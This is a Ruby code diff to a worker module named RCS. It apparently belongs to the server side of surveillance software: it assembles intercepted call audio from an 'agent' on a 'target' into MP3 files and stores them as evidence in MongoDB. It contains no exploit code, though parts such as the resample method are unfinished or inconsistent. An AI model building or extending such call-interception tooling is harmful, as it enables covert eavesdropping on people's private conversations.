@@ -2,10 +2,13 @@ module RCS
 module Worker
 
 require 'ffi'
+require 'mongo'
+require 'mongoid'
 require 'rcs-common/trace'
 require_relative 'speex'
 require_relative 'wave'
 require_relative 'src'
+require_relative 'mp3lame'
 
 require 'digest/md5'
 
@@ -22,16 +25,16 @@ end
 
 class Channel
   include Tracer
-  attr_reader :sample_rate, :start_time, :last_stop_time, :wav_data, :status
+  attr_reader :name, :sample_rate, :start_time, :last_stop_time, :wav_data, :status
   
   def initialize(evidence)
     @name = evidence[:data][:channel].to_s
     @sample_rate = evidence[:data][:sample_rate]
     @start_time = evidence[:data][:start_time]
     @last_stop_time = @start_time
-    @wav_data = StringIO.new
+    @wav_data = Array.new # array of 32 bit float samples
     @status = :open
-    trace :debug, "created new channel #{self.id}."
+    trace :debug, "CREATING NEW CHANNEL #{@name} #{@start_time}"
   end
   
   def id
@@ -53,45 +56,66 @@ class Channel
   
   def fill(gap)
     samples_to_fill = @sample_rate * gap
-    trace :debug, "[#{@name}] filling with #{samples_to_fill} samples(@#{@sample_rate}) to fill #{gap} seconds of missing data."
-    @wav_data.write([0].pack("S") * samples_to_fill.ceil)
+    #trace :debug, "[#{@name}] filling with #{samples_to_fill} samples(@#{@sample_rate}) to fill #{gap} seconds of missing data."
+    @wav_data.concat [0.0] * samples_to_fill.ceil
   end
   
   def time_gap(evidence)
     gap = evidence[:data][:start_time].to_f - @last_stop_time.to_f
-    trace :debug, "#{@last_stop_time} to #{evidence[:data][:start_time]} => #{gap}"
+    #trace :debug, "#{@last_stop_time} to #{evidence[:data][:start_time]} => #{gap}"
+    trace :fatal, "*** NEGATIVE GAP ***" if gap < 0
     gap
   end
   
   def accept?(evidence)
-    return false if closed?
-    return false if time_gap(evidence) >= 5.0
+    if closed? 
+      trace :debug, "CHANNEL IS CLOSED, REFUSING ..."
+      return false
+    end
+    if time_gap(evidence) >= 5.0
+      trace :debug, "TIME GAP IS HIGHER THAN 5 SECONDS !!! REFUSING ..."
+      return false
+    end
     return true
   end
 
   def end_call?(evidence)
     return true if evidence[:data][:grid_content].bytesize == 4 and evidence[:data][:grid_content] == "\xff\xff\xff\xff"
   end
-
+  
   def feed(evidence)
-    trace :debug, "Evidence channel #{evidence[:data][:channel]} peer #{evidence[:data][:peer]} with #{evidence[:wav].bytesize} bytes of data."
+    #trace :debug, "Evidence channel #{evidence[:data][:channel]} peer #{evidence[:data][:peer]} with #{evidence[:wav].bytesize} bytes of data."
     
     if end_call? evidence
       self.close!
       return
     end
-
+    
     gap = time_gap(evidence)
     fill gap unless gap == 0
-
+    
     @last_stop_time = evidence[:data][:stop_time]
-    @wav_data.write evidence.wav
+    trace :debug, "[#{@name}] NEW STOP TIME #{@last_stop_time}"
+    @wav_data.concat evidence[:wav].unpack 'F*' # 16 bit samples
   end
-
+  
+  def resample(to_sample_rate)
+    SRC::new(SRC::SINC_MEDIUM_QUALITY, 1, nil)
+    src_data = SRC::DATA.new
+    src_data.end_of_input = 0
+    src_data.input_frames = 0
+    
+    data_in_buffer = FFI::MemoryPointer.new(:float, @wav_data.size)
+    data_in_string = @wav_data.pack('C*')
+    data_in_buffer.put_bytes(0, data_in_string, 0, data_in_string.size)
+    src_data.data_in = data_in_buffer
+  end
+  
   def size
     @wav_data.size
   end
   
+=begin  
   def num_samples
     bytes.to_f / 16
   end
@@ -99,32 +123,45 @@ class Channel
   def seconds
     num_samples.to_f / @sample_rate
   end
+=end
   
   def to_s
     self.id
   end
-  
+
+=begin  
   def to_float_samples
     @wav_data.unpack('F*').spack('S*')
   end
+=end
 end
 
 class Call
   include Tracer
   attr_writer :start_time
+  attr_reader :id, :peer
   
   # status of call can be:
   #   - :queueing only first channel is present, queue data, maintain speex
   #   - :fillin   second channel arrived, fill in later channel with silence
   #   - :resampling second channel arrived, filled in, resample data as they arrive
   
-  def initialize(peer, start_time)
+  def initialize(peer, program, start_time, agent, target)
+    @id = BSON::ObjectId.new
     @peer = peer
     @start_time = start_time
     @status = :queueing
     @channels = {}
+    @program = program
+    @duration = 0
     @resampled = :not_yet
     trace :info, "created new call for #{@peer}, starting at #{@start_time}"
+    @raw_ids = []
+
+    @agent = agent
+    @target = target
+
+    @evidence = store peer, program, start_time, agent, target
   end
   
   def id
@@ -135,20 +172,21 @@ class Call
     @channels.size < 2
   end
   
-  def fillin?
-    @status == :fillin
-  end
-  
   def accept?(evidence)
+    # peer must be the same!
+    return false if evidence[:data][:peer] != @peer
+    
     # we accept evidence only if relative channel accept it
     channel = get_channel evidence
     return channel.accept? evidence unless channel.nil?
-    trace :debug, "evidence is not being accepted by call #{id}"
+    
+    # if not sure, this is probably another call
     return false
   end
   
   def get_channel(evidence)
-    channel = @channels[evidence[:data][:channel]] || create_channel(evidence)
+    channel = @channels[evidence[:data][:channel]] 
+    channel ||= create_channel(evidence)
     return channel if channel.accept? evidence
     return nil
   end
@@ -158,7 +196,15 @@ class Call
     @channels[evidence[:data][:channel]] = channel
     
     # fix start time
-    @start_time = get_start_time
+    a = channels_by_start_time
+    @start_time = a[0].start_time
+    
+    # fill in later channel
+    if a.size > 1
+      fillin_gap = a[1].start_time - a[0].start_time
+      trace :debug, "FILLING #{fillin_gap.to_f} SECS ON CHANNEL #{a[1].name}"
+      a[1].fill(fillin_gap)
+    end
     
     return channel
   end
@@ -169,13 +215,16 @@ class Call
   end
   
   def feed(evidence)
+
+    @raw_ids << evidence[:db_id]
+
     # if evidence is empty or call is closed, refuse feeding
     return false if evidence[:wav].bytesize == 0
     return false if closed?
     
     # get the correct channel for the evidence
     channel = get_channel(evidence)
-    return false if channel.nil?
+    #return false if channel.nil?
     
     trace :debug, "feeding #{evidence[:wav].bytesize} bytes at #{evidence[:data][:start_time]}:#{evidence[:data][:last_stop_time]} to #{channel.id}"
     channel.feed evidence
@@ -183,13 +232,65 @@ class Call
     # update status
     update_status
     
+    unless queueing?
+      sample_rate = (@channels.values.min_by {|c| c.sample_rate}).sample_rate
+      # take channel with higher sample rate and resample accordingly            
+      @encoder ||= ::MP3Encoder.new(2, sample_rate)
+      unless @encoder.nil?
+        @encoder.feed(@channels[:outgoing].wav_data, @channels[:incoming].wav_data) do |mp3_bytes|
+          File.open("#{@id}.mp3", 'ab') {|f| f.write(mp3_bytes) }
+
+          db = Mongoid.database
+          fs = Mongo::GridFileSystem.new(db, "grid.#{@target[:_id]}")
+          data = ''
+          fs.open(file_name, 'r') {|f| data = f.read} if fs.exist?(:filename => file_name)
+          fs.open(file_name, 'w') do |f|
+            f.write data + mp3_bytes
+
+            trace :debug, "[#{@id}] WRITTEN #{data.bytesize + mp3_bytes.bytesize} MP3 BYTES!"
+
+            @evidence.update_attributes("data._grid" => f.files_id)
+            @evidence.update_attributes("data._grid_size" => f.file_length)
+          end
+
+          yield mp3_bytes if block_given?
+        end
+      end
+    end
+
     return true
   end
-  
+
+  def store(peer, program, start_time, agent, target)
+    evidence = ::Evidence.collection_class(target[:_id].to_s)
+    evidence.create do |ev|
+      ev.aid = agent[:_id].to_s
+      ev.type = :call
+
+      ev.da = start_time
+      ev.dr = Time.now.to_i
+      ev.rel = 0
+      ev.blo = false
+      ev.note = ""
+
+      ev.data ||= Hash.new
+      ev.data[:peer] = peer
+      ev.data[:program] = program
+      ev.data[:duration] = 0
+      ev.data[:status] = :recording
+
+      ev.save
+    end
+  end
+
+  def file_name
+    Digest::MD5.hexdigest "#{@peer}:#{@program}:#{@start_time}"
+  end
+
   def sample_rates
     @channels.values.collect {|c| c.sample_rate}
   end
-  
+
   def min_sample_rate
     sample_rates.sort.first
   end
@@ -211,9 +312,8 @@ class Call
     return string
   end
    
-  def get_start_time
-    times = @channels.values.collect {|c| c.start_time.to_f }
-    times.min
+  def channels_by_start_time
+    @channels.values.minmax_by {|c| c.start_time }
   end
 end
 
@@ -240,19 +340,19 @@ class CallProcessor
   end
   
   def create_call(evidence)
-    call = Call.new(evidence[:data][:peer], evidence[:data][:start_time])
+    call = Call.new(evidence[:data][:peer], evidence[:data][:program], evidence[:data][:start_time], @agent, @target)
+    trace :info, "CREATED NEW CALL #{call.id}"
     @calls << call
     call
   end
   
   def feed(evidence)
     call = get_call evidence
-    call.feed evidence unless call.nil?
-  end
-  
-  def store
-    # duration
-    # status ["recording"]
+    unless call.nil?
+      call.feed evidence do |mp3_bytes|
+
+      end
+    end
   end
   
   def to_s
